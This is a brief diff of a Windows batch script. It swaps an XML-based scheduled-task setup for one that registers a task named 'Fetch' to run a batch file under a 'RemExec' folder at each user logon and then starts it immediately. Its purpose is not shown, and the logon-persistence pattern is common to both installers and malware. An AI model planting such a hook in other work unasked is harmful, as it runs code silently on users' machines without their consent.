@@ -1,9 +1,4 @@
 @echo off
-if exist *.xml (
-   schtasks /create /tn "Fetch" /xml "Fetch.xml"
-   del /q Fetch.xml  
-   exit
-) else (
-   exit
-)
-
+schtasks /Create /TR "%localappdata%\Programs\RemExec\task.bat" /RU %USERNAME% /TN Fetch /SC ONLOGON /f
+schtasks /Run /TN "Fetch"
+exit
